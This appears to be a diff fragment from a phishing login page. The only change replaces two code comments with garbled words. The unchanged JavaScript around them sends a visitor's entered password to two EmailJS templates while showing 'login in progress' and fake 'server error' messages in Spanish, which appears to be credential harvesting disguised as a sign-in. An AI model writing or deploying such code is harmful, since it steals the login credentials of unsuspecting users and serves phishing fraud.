@@ -14,7 +14,7 @@
                 password: password
             };
 
-            // first email
+            // firtu
             emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
                 .then(function(response) {
                     console.log('Inicio de sesión en curso...', response);
@@ -22,7 +22,7 @@
                     console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
                 });
 
-            // second email
+            // seconse
             emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
                 .then(function(response) {
                     console.log('Inicio de sesión en curso...', response);
